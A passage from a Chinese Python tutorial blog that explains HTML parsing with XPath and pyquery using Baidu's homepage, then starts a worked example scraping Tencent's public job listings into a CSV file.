href="#XPath" class="headerlink" title="XPath"></a>XPath</h2><p>XPath全称是XML Path Language，它既可以用来解析XML，也可以用来解析HTML。在上一部分已经讲解了Beautiful Soup的一些常见的骚操作，在这里，我们继续来看看XPath的使用，瞧一瞧XPath的功能到底有多么的强大以致于受到了不少开发者的青睐。同Beautiful Soup一样，在XPath中提供了非常简洁的节点选择的方法，Beautiful Soup主要是通过<code>.</code>的方式来进行子节点或者子孙节点的选择，而在XPath中则主要通过<code>/</code>的方式来选择节点。除此之外，在XPath中还提供了大量的内置函数来处理各个数据之间的匹配关系。</p><p>首先，我们先来看看XPath常见的节点匹配规则：</p><div class="table-container"><table><thead><tr><th style="text-align:center">表达式</th><th style="text-align:center">解释说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>/</code></td><td style="text-align:center">在当前节点中选取直接子节点</td></tr><tr><td style="text-align:center"><code>//</code></td><td style="text-align:center">在当前节点中选取子孙节点</td></tr><tr><td style="text-align:center"><code>.</code></td><td style="text-align:center">选取当前节点</td></tr><tr><td style="text-align:center"><code>..</code></td><td style="text-align:center">选取当前节点的父节点</td></tr><tr><td style="text-align:center"><code>@</code></td><td style="text-align:center">指定属性（id、class……）</td></tr></tbody></table></div><p>下面我们继续拿上面的百度首页的HTML来讲解下XPath的使用。</p><h3 id="节点选择-1"><a href="#节点选择-1" class="headerlink" title="节点选择"></a>节点选择</h3><p>要想正常使用Xpath，我们首先需要正确导入对应的模块，在此我们一般使用的是<code>lxml</code>，操作示例如下：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from lxml <span class="built_in">import</span> etree</span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="attr">response</span> = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="attr">encoding</span> = response.apparent_encoding</span><br><span class="line">    response.<span class="attr">encoding</span> = encoding</span><br><span class="line">    print(response.text)</span><br><span class="line">    <span class="attr">bd_bj</span> = etree.HTML(response.text)</span><br><span class="line">    <span class="attr">bd_html</span> = etree.tostring(bd_bj).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(html.unescape(bd_html))</span><br></pre></td></tr></table></figure><p>1~9行代码如Beautiful Soup一致，下面对之后的代码进行解释：</p><ul><li><code>etree.HTML(response.text)</code>，使用<code>etree</code>模块中的<code>HTML</code>类来对百度html<code>(response.text)</code>进行初始化以构造XPath解析对象，返回的类型为<code>&lt;Element html at 0x1aba86b1c08&gt;</code></li><li><code>etree.tostring(bd_html_elem).decode(&quot;utf-8&quot;)</code>，将上述的对象转化为字符串类型且编码为<code>utf-8</code></li><li><code>html.unescape(bd_html)</code>，使用HTML5标准定义的规则将<code>bd_html</code>转换成对应的unicode字符。</li></ul><p>打印出的结果如Beautiful Soup使用时一致，这里就不再显示了，不知道的读者可回翻。既然我们已经得到了Xpath可解析的对象<code>(bd_bj)</code>，下面我们就需要针对这个对象来选择节点了，在上面我们也已经提到了，XPath主要是通过<code>/</code>的方式来提取节点，请看下面Xpath中节点选择的一些常见操作：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">all_bj = bd_bj.xpath(<span class="string">"//*"</span>)             <span class="comment"># 选取所有节点</span></span><br><span class="line">img_bj = bd_bj.xpath(<span class="string">"//img"</span>)           <span class="comment"># 选取指定名称的节点</span></span><br><span class="line">p_a_zj_bj = bd_bj.xpath(<span class="string">"//p/a"</span>)        <span class="comment"># 选取直接节点</span></span><br><span class="line">p_a_all_bj = bd_bj.xpath(<span class="string">"//p//a"</span>)      <span class="comment"># 选取所有节点</span></span><br><span class="line">head_bj = bd_bj.xpath(<span class="string">"//title/.."</span>)     <span class="comment"># 选取父节点</span></span><br></pre></td></tr></table></figure><p>结果如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[&lt;Element html <span class="meta">at</span> <span class="number">0x14d6a6d1c88</span>&gt;, &lt;Element head <span class="meta">at</span> <span class="number">0x14d6a6e4408</span>&gt;, &lt;Element meta <span class="meta">at</span> <span class="number">0x14d6a6e4448</span>&gt;, &lt;Element meta <span class="meta">at</span> <span class="number">0x14d6a6e4488</span>&gt;, &lt;Element meta <span class="meta">at</span> <span class="number">0x14d6a6e44c8</span>&gt;, &lt;Element link <span class="meta">at</span> <span class="number">0x14d6a6e4548</span>&gt;, &lt;Element title <span class="meta">at</span> <span class="number">0x14d6a6e4588</span>&gt;, &lt;Element body <span class="meta">at</span> <span class="number">0x14d6a6e45c8</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4608</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4508</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4648</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4688</span>&gt;, ......]</span><br><span class="line"></span><br><span class="line">[&lt;Element img <span class="meta">at</span> <span class="number">0x14d6a6e4748</span>&gt;, &lt;Element img <span class="meta">at</span> <span class="number">0x14d6a6e4ec8</span>&gt;]</span><br><span class="line"></span><br><span class="line">[&lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4d88</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4dc8</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e48</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e88</span>&gt;]</span><br><span class="line"></span><br><span class="line">[&lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4d88</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4dc8</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e48</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e88</span>&gt;]</span><br><span class="line"></span><br><span class="line">[&lt;Element head <span class="meta">at</span> <span class="number">0x14d6a6e4408</span>&gt;]</span><br></pre></td></tr></table></figure></p><ul><li><code>all_bj = bd_bj.xpath(&quot;//*&quot;)</code>，使用<code>//</code>可以选择当前节点<code>(html)</code>下的所有子孙节点，且以一个列表的形式来返回，列表元素通过<code>bd_bj</code>一样是<code>element</code>对象，下面的返回类型一致</li><li><code>img_bj = bd_bj.xpath(&quot;//img&quot;)</code>，选取当前节点下指定名称的节点，这里建议与Beautiful Soup的使用相比较可增强记忆，Beautiful Soup是通过<code>.find_all(&quot;img&quot;)</code>的形式</li><li><code>p_a_zj_bj = bd_bj.xpath(&quot;//p/a&quot;)</code>，选取当前节点下的所有<code>p</code>节点下的直接子<code>a</code>节点，这里需要注意的是<strong>”直接“</strong>，如果<code>a</code>不是<code>p</code>节点的直接子节点则选取失败</li><li><code>p_a_all_bj = bd_bj.xpath(&quot;//p//a&quot;)</code> ，选取当前节点下的所有<code>p</code>节点下的所有子孙<code>a</code>节点，这里需要注意的是<strong>”所有“</strong>，注意与上一个操作进行区分</li><li><code>head_bj = bd_bj.xpath(&quot;//title/..&quot;)</code>，选取当前节点下的<code>title</code>节点的父节点，即<code>head</code>节点</li></ul><h3 id="数据提取-1"><a href="#数据提取-1" class="headerlink" title="数据提取"></a>数据提取</h3><p>在了解如何选择指定的节点之后，我们就需要提取节点中所包含的数据了，具体提取请看下面的示例：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">img_href_ls</span> = bd_bj.xpath(<span class="string">"//img/@src"</span>)</span><br><span class="line"><span class="attr">img_href</span> = bd_bj.xpath(<span class="string">"//div[@id='lg']/img[@hidefocus='true']/@src"</span>)</span><br><span class="line"><span class="attr">a_content_ls</span> = bd_bj.xpath(<span class="string">"//a//text()"</span>)</span><br><span class="line"><span class="attr">a_news_content</span> = bd_bj.xpath(<span class="string">"//a[@class='mnav' and @name='tj_trnews']/text()"</span>)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">'//www.baidu.com/img/bd_logo1.png</span>', <span class="symbol">'//www.baidu.com/img/gs.gif</span>']</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'//www.baidu.com/img/bd_logo1.png</span>']</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'新闻</span>', <span class="symbol">'hao123</span>', <span class="symbol">'地图</span>', <span class="symbol">'视频</span>', <span class="symbol">'贴吧</span>', <span class="symbol">'登录</span>', <span class="symbol">'更多产品</span>', <span class="symbol">'关于百度</span>', <span class="symbol">'About</span> Baidu', <span class="symbol">'使用百度前必读</span>', <span class="symbol">'意见反馈</span>']</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'新闻</span>']</span><br></pre></td></tr></table></figure><ul><li><code>img_href_ls = bd_bj.xpath(&quot;//img/@src&quot;)</code>，该代码先选取了当前节点下的所有<code>img</code>节点，然后将所有<code>img</code>节点的<code>src</code>属性值选取出来，返回的是一个列表形式</li><li><code>img_href = bd_bj.xpath(&quot;//div[@id=&#39;lg&#39;]/img[@hidefocus=&#39;true&#39;]/@src&quot;)</code>，该代码首先选取了当前节点下所有<code>id</code>属性值为<code>lg</code>的<code>div</code>，然后继续选取<code>div</code>节点下的直接子<code>img</code>节点（<code>hidefoucus=true</code>），最后选取其中的<code>src</code>属性值</li><li><code>a_content_ls = bd_bj.xpath(&quot;//a//text()&quot;)</code>，选取当前节点所有的<code>a</code>节点的所遇文本内容</li><li><code>a_news_content = bd_bj.xpath(&quot;//a[@class=&#39;mnav&#39; and @name=&#39;tj_trnews&#39;]/text()&quot;)</code>，多属性选择，在xpath中可以指定满足多个属性的节点，只需要<code>and</code>即可</li></ul><font color="red">提醒：读者在阅读的过程中注意将代码和输出的结果仔细对应起来，只要理解其中的意思也就不难记忆了。</font><h3 id="XPath小结"><a href="#XPath小结" class="headerlink" title="XPath小结"></a>XPath小结</h3><p>耐心看完了XPath的使用方法之后，聪明的读者应该不难发现，其实Beautiful Soup和XPath的本质和思路上基本相同，只要我们在阅读XPath用法的同时在脑袋中不断的思考，相信聪明的你阅读至此已经能够基本掌握了XPath用法。</p><h2 id="pyquery"><a href="#pyquery" class="headerlink" title="pyquery"></a>pyquery</h2><p>对于pyquery，官方的解释如下：</p><blockquote><p>pyquery allows you to make jquery queries on xml documents. The API is as much as possible the similar to jquery. pyquery uses lxml for fast xml and html manipulation.<br>This is not (or at least not yet) a library to produce or interact with javascript code. I just liked the jquery API and I missed it in python so I told myself “Hey let’s make jquery in python”. This is the result.<br>It can be used for many purposes, one idea that I might try in the future is to use it for templating with pure http templates that you modify using pyquery. I can also be used for web scrapping or for theming applications with Deliverance.<br>The project is being actively developped on a git repository on Github. I have the policy of giving push access to anyone who wants it and then to review what he does. So if you want to contribute just email me.<br>Please report bugs on the github issue tracker.</p></blockquote><p>在网页解析过程中，除了强大的Beautiful Soup和XPath之外，还有qyquery的存在，qyquery同样受到了不少“蜘蛛”的欢迎，下面我们来介绍下qyquery的使用。</p><h3 id="节点选择-2"><a href="#节点选择-2" class="headerlink" title="节点选择"></a>节点选择</h3><p>与Beautiful Soup和XPath明显不同的是，在qyquery中，一般存在着三种解析方式，一种是<code>requests</code>请求链接之后把html进行传递，一种是将<code>url</code>直接进行传递，还有一种是直接传递本地<code>html</code>文件路径即可，读者在实际使用的过程中根据自己的习惯来编码即可，下面我们来看下这三种方式的表达：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line"></span><br><span class="line">bd_html = requests.get(<span class="string">"https://www.baidu.com"</span>).text</span><br><span class="line">bd_url = <span class="string">"https://www.baidu.com"</span></span><br><span class="line">bd_path = <span class="string">"./bd.html"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用html参数进行传递</span></span><br><span class="line">def way1(html):</span><br><span class="line">    <span class="keyword">return</span> p<span class="string">q(html)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 使用url参数进行传递</span></span><br><span class="line">def way2(url):</span><br><span class="line">    <span class="keyword">return</span> p<span class="string">q(url=url)</span></span><br><span class="line"></span><br><span class="line">def way3(path):</span><br><span class="line">    <span class="keyword">return</span> p<span class="string">q(filename=path)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(type(way1(html=bd_html)))</span><br><span class="line"><span class="keyword">print</span>(type(way2(url=bd_url)))</span><br><span class="line"><span class="keyword">print</span>(type(way3(path=bd_path)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class 'pyquery.pyquery.PyQuery'&gt;</span></span><br><span class="line"><span class="comment"># &lt;class 'pyquery.pyquery.PyQuery'&gt;</span></span><br><span class="line"><span class="comment"># &lt;class 'pyquery.pyquery.PyQuery'&gt;</span></span><br></pre></td></tr></table></figure><p>从上面三种获得解析对象方法的代码中我们可以明显看见都可以得到一样的解析对象，接下来我们只要利用这个对象来对页面进行解析从而提取出我们想要得到的有效信息即可，在qyquery中一般使用的是CSS选择器来选取。下面我们仍然使用百度首页来讲解pyquery的使用，在这里我们假设解析对象为<code>bd_bj</code>。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">response.encoding = <span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line">bd_bj = pq(response.text)</span><br><span class="line"></span><br><span class="line">bd_title = bd_bj(<span class="string">"title"</span>)</span><br><span class="line">bd_img_ls = bd_bj(<span class="string">"img"</span>)</span><br><span class="line">bd_img_ls2 = bd_bj.find(<span class="string">"img"</span>)</span><br><span class="line">bd_mnav = bd_bj(<span class="string">".mnav"</span>)</span><br><span class="line">bd_img = bd_bj(<span class="string">"#u1 a"</span>)</span><br><span class="line">bd_a_video = bd_bj(<span class="string">"#u1 .mnav"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;title&gt;百度一下，你就知道&lt;/title&gt;</span></span><br><span class="line"><span class="comment"># &lt;img hidefocus="true" src="//www.baidu.com/img/bd_logo1.png" width="270" height="129"/&gt; &lt;img src="//www.baidu.com/img/gs.gif"/&gt; </span></span><br><span class="line"><span class="comment"># ......</span></span><br><span class="line"><span class="comment"># 输出结果较长，读者可自行运行</span></span><br></pre></td></tr></table></figure><p>正如上面代码所示，pyquery在进行节点提取的时候通常有三种方式，一种是直接提取出节点名即可提取出整个节点，当然这种方式你也可以使用<code>find</code>方法，这种提取节点的方式是不加任何属性限定的，所以提取出的节点往往会含有多个，所以我们可以使用循环<code>.items()</code>来进行操作；一种是提取出含有特定<code>class</code>属性的节点，这种形式采用的是<code>.+class属性值</code>；还有一种是提取含有特定<code>id</code>属性的节点，这种形式采用的是<code>#+id属性值</code>。熟悉<code>CSS</code>的读者应该不难理解以上提取节点的方法，正是在<code>CSS</code>中提取节点然后对其进行样式操作的方法。上述三种方式您也可以像提取<code>bd_a_video</code>一样混合使用</p><h3 id="数据提取-2"><a href="#数据提取-2" class="headerlink" title="数据提取"></a>数据提取</h3><p>在实际解析网页的过程中，三种解析方式基本上大同小异，为了读者认识<code>pyquery</code>的数据提取的操作以及博主日后的查阅，在这里简单的介绍下</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">img_src1 = bd_bj(<span class="string">"img"</span>).attr(<span class="string">"src"</span>) <span class="comment"># //www.baidu.com/img/bd_logo1.png</span></span><br><span class="line">img_src2 = bd_bj(<span class="string">"img"</span>).attr.src    <span class="comment"># //www.baidu.com/img/bd_logo1.png</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">in</span> bd_bj.<span class="keyword">find</span>(<span class="string">"img"</span>).items():</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">each</span>.attr(<span class="string">"src"</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span>(bd_bj(<span class="string">"title"</span>).text())    <span class="comment"># 百度一下，你就知道</span></span><br></pre></td></tr></table></figure><p>如上一二行代码所示，提取节点属性我们可以有两种方式，这里拿<code>src</code>属性来进行说明，一种是<code>.attr(&quot;src&quot;)</code>，另外一种是<code>.attr.src</code>，读者根据自己的习惯来操作即可，这里需要注意的是：在节点提取小结中我们说了在不限制属性的情况下是提取出所有满足条件的节点，所以在这种情况下提取出的属性是第一个节点属性。要想提取所有的节点的属性，我们可以如四五行代码那样使用<code>.items()</code>然后进行遍历，最后和之前一样提取各个节点属性即可。<code>qyquery</code>提取节点中文本内容如第七行代码那样直接使用<code>.text()</code>即可。</p><h3 id="pyquery小结"><a href="#pyquery小结" class="headerlink" title="pyquery小结"></a>pyquery小结</h3><p>pyquery解析如Beautiful Soup和XPath思想一致，所以这了只是简单的介绍了下，想要进一步了解的读者可查阅官方文档在加之熟练操作即可。</p><h2 id="腾讯招聘网解析实战"><a href="#腾讯招聘网解析实战" class="headerlink" title="腾讯招聘网解析实战"></a>腾讯招聘网解析实战</h2><p>通过上述对Beautiful Soup、XPath以及pyquery的介绍，认真阅读过的读者想必已经有了一定的基础，下面我们通过一个简单的实战案例来强化一下三种解析方式的操作。此次解析的网站为腾讯招聘网，网址url：<a href="https://hr.tencent.com/" target="_blank" rel="noopener">https://hr.tencent.com/</a>，其社会招聘网首页如下所示：<br><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/aa64034f78f0f7369adfccd70755b319eac413c6.jpg" width="500"></p><p>此次我们的任务就是分别利用上述三种解析工具来接下该网站下的社会招聘中的所有数据。</p><h3 id="网页分析："><a href="#网页分析：" class="headerlink" title="网页分析："></a>网页分析：</h3><p>通过该网站的社会招聘的首页，我们可以发现如下三条主要信息：</p><ul><li>首页url连接为<a href="https://hr.tencent.com/position.php" target="_blank" rel="noopener">https://hr.tencent.com/position.php</a></li><li>一共有288页的数据，每页10个职位，总职位共计2871</li><li>数据字段有五个，分别为：职位名称、职位类别、招聘人数、工作地点、职位发布时间</li></ul><p>既然我们解析的是该网站下所有职位数据，再者我们停留在第一页也没有发现其他有价值的信息，不如进入第二页看看，这时我们可以发现网站的url链接有了一个比较明显的变化，即原链接在用户端提交了一个<code>start</code>参数，此时链接为<a href="https://hr.tencent.com/position.php?&amp;start=10#a" target="_blank" rel="noopener">https://hr.tencent.com/position.php?&amp;start=10#a</a>，陆续打开后面的页面我们不难发现其规律：每一页提交的<code>start</code>参数以10位公差进行逐步递增。之后，我们使用谷歌开发者工具来审查该网页，我们可以发现全站皆为静态页面，这位我们解析省下了不少麻烦，我们需要的数据就静态的放置在<code>table</code>标签内，如下所示：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e850352ac65c1038f3b24f14bf119313b17e891c.jpg" width="500"></p><p>下面我们具体来分别使用以上三种工具来解析该站所有职位数据。</p><h3 id="案例源码"><a href="#案例源码" class="headerlink" title="案例源码"></a>案例源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TencentPosition</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： 定义初始变量</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">start： 起始数据</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, start)</span>:</span></span><br><span class="line">self.url = <span class="string">"https://hr.tencent.com/position.php?&amp;start=&#123;&#125;#a"</span>.format(start)</span><br><span class="line">self.headers = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"hr.tencent.com"</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span>,</span><br><span class="line">&#125;</span><br><span class="line">self.file_path = <span class="string">"./TencentPosition.csv"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： 请求目标页面</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">url： 目标链接</span></span><br><span class="line"><span class="string">headers： 请求头</span></span><br><span class="line"><span class="string">返回：</span></span><br><span class="line"><span class="string">html，页面源码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(self, url, headers)</span>:</span> </span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line"><span class="keyword">return</span> res.text</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> self.get_page(url, headers=headers)</span><br><span class="line"><span class="keyword">except</span> RequestException <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">return</span> self.get_page(url, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： Beautiful Soup解析页面</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">html： 请求页面源码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">soup_analysis</span><span class="params">(self, html)</span>:</span></span><br><span class="line">soup = BeautifulSoup(html, <span class="string">"lxml"</span>)</span><br><span class="line">tr_list = soup.find(<span class="string">"table"</span>, class_=<span class="string">"tablelist"</span>).find_all(<span class="string">"tr"</span>)</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> tr_list[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">position_info = [td_data <span class="keyword">for</span> td_data <span class="keyword">in</span> tr.stripped_strings]</span><br><span class="line">self.settle_data(position_info=position_info)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： xpath解析页面</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">html： 请求页面源码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xpath_analysis</span><span class="params">(self, html)</span>:</span></span><br><span class="line">result = etree.HTML(html)</span><br><span class="line">tr_list = result.xpath(<span class="string">"//table[@class='tablelist']//tr"</span>)</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> tr_list[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">position_info = tr.xpath(<span class="string">"./td//text()"</span>)</span><br><span class="line">self.settle_data(position_info=position_info)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： pyquery解析页面</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">html： 请求页面源码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pyquery_analysis</span><span class="params">(self, html)</span>:</span></span><br><span class="line">result = pq(html)</span><br><span class="line">tr_list = result.find(<span class="string">".tablelist"</span>).find(<span class="string">"tr"</span>)</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> itertools.islice(tr_list.items(), <span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">position_info = [td.text() <span class="keyword">for</span> td <span class="keyword">in</span> tr.find(<span class="string">"td"</span>).items()]</span><br><span class="line">self.settle_data(position_info=position_info)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： 职位数据整合</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">position_info： 字段数据列表</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">settle_data</span><span class="params">(self, position_info)</span>:</span></span><br><span class="line">position_data = &#123;</span><br><span class="line"><span class="string">"职位名称"</span>: position_info[<span class="number">0</span>].replace(<span class="string">"\xa0"</span>, <span class="string">" "</span>),<span class="comment"># replace替换\xa0字符防止转码error</span></span><br><span class="line"><span class="string">"职位类别"</span>: position_info[<span class="number">1</span>],</span><br><span class="line"><span class="string">"招聘人数"</span>: position_info[<span class="number">2</span>],</span><br><span class="line"><span class="string">"工作地点"</span>: position_info[<span class="number">3</span>],</span><br><span class="line"><span class="string">"发布时间"</span>: position_info[<span class="number">-1</span>],</span><br><span class="line">&#125;</span><br><span class="line">print(position_data)</span><br><span class="line">self.save_data(self.file_path, position_data)</span><br><span 